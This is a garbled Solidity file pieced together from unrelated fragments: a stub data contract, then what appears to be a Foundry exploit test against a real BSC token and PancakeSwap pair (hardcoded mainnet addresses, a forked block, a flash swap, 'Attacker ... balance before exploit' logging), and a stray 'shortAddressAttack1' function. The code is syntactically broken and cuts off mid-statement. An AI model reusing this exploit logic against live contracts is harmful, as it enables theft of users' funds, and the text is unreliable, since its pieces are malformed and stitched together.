
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IUSD {
  function batchToken(address[] calldata _addr, uint256[]calldata _num, address token) external;
  function swapTokensForExactTokens(uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external returns (uint[] memory amounts) ;
    function buy(uint256) external ;
    function sell(uint256) external ;
      function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
      function sync ()external };
contract ContractTest is DSTest {
  IPancakePair PancakePair =;
    IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
  address private usdt = 0x55d398326f99059fF775485246999027B3197955;
  address private swap = 0x5a9846062524631C01ec11684539623DAb1Fae58;
  IERC20 Usdt = IERC20(usdt);
  address private zoom = 0x9CE084C378B3E65A164aeba12015ef3881E0F853;
  address private batch = 0x47391071824569F29381DFEaf2f1b47A4004933B;
  address private fUSDT = 0x62D51AACb079e882b1cb7877438de485Cba0dD3f;
  address private pp = 0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5;
  IERC20 Zoom = IERC20(zoom);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("bsc", 21055930)};
  function testExploit() public {
    emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit",
      Usdt.balanceOf(address(this)),;
      18);
    PancakePair.swap(30000000000000000000000000000000000000,0,address(this),new bytes(1));
    emit log_named_decimal_uint
function shortAddressAttack1(address to, uint256 amount) public {
    payable(to).transfer(amount)}